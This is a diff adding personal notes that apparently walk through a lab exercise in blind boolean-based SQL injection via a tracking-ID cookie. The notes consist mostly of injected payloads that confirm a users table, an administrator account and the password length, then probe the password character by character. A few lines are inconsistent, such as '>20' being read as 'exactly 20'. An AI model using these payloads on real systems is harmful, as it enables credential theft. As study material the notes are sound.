@@ -1,0 +1,30 @@
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k'
+
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and 1=1--'
+' and 1=0 --
+-> TRUE -> Welcome back
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and 1=0--'
+' and 1=0--
+-> FALSE -> no Welcome back
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and (select 'x' from users LIMIT 1)='x'--'
+' and (select 'x' from users LIMIT 1)='x'--
+-> users table exists in the database.
+
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and (select username from users where username='administrator')='administrator'--'
+' and (select username from users where username='administrator')='administrator'--
+-> administrator user exists
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--
+-> password is exactly 20 characters
+
+select tracking-id from tracking-table where trackingId = 'owvghnE09gBcfq6k' and (select substring(password,2,1) from users where username='administrator')='a'--'
+' and (select substring(password,1,1) from users where username='administrator')='a'--
+
